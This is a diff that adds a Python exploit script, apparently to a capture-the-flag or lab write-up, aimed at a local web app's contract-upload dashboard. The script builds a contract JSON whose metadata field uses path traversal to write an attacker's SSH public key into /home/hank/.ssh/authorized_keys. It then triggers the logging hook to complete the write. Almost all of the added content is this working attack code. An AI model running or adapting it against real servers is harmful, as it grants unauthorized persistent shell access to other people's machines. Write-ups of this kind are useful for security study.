@@ -344,3 +344,93 @@ if __name__ == "__main__":
 
 ```
 
+
+``` py
+
+
+import requests
+import json
+
+url = "http://127.0.0.1:5000"
+ssh_pub_key = "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIhm+GPKszRx8Q3ZiwAHUn4W3ZUr0CP8w7yIEn4OY+ud joel@DESKTOP-6L9K96J"
+
+s = requests.Session()
+
+def upload_contract():
+
+    contract = {
+
+      "name": "pwn",
+      "id": 0,
+      "owner": "Developer",
+      "debug": "True",
+      "logic": {
+        "claim": "allow"
+      },
+      "hooks": {
+        "on_claim": "log"
+      },
+      "storage": {
+        "balances": {}
+      },
+      "__meta__": {
+        "log_file": "../../../../home/hank/.ssh/authorized_keys",
+        "log_content": {
+          "on_claim":ssh_pub_key
+        }
+      }
+    }
+
+    with open("contract.json", "w") as file:
+
+         json.dump(contract, file, indent=4)
+
+    data = {"action":"upload_contract",}
+
+    files = {"contract_file": ("contract.json", open("contract.json", "rb"), "application/json",)}
+
+    try:
+
+        r = s.post(url + "/dashboard", data=data, files=files, timeout=10)
+        print(f"[+] status code: {r.status_code}")
+
+    except requests.exceptions.Timeout:
+
+                       print("[-] Error: Timeout")
+
+    except requests.exceptions.ConnectionError:
+
+                       print("[-] Error: Can't connect to the server")
+
+    except Exception as e:
+
+                       print(f"[-] Error: {e}")
+
+def contract_claim():
+
+    try:
+
+        r = s.post(url + "/dashboard", data={"action":"contract_claim"}, timeout=10)
+        print(f"[+] status code: {r.status_code}")
+
+    except requests.exceptions.Timeout:
+
+                       print("[-] Error: Timeout")
+
+    except requests.exceptions.ConnectionError:
+
+                       print("[-] Error: Can't connect to the server")
+
+    except Exception as e:
+
+                       print(f"[-] Error: {e}")
+
+    print("[+] Exploit has done!")
+if __name__ == "__main__":
+
+           upload_contract()
+           contract_claim()
+
+
+```
+
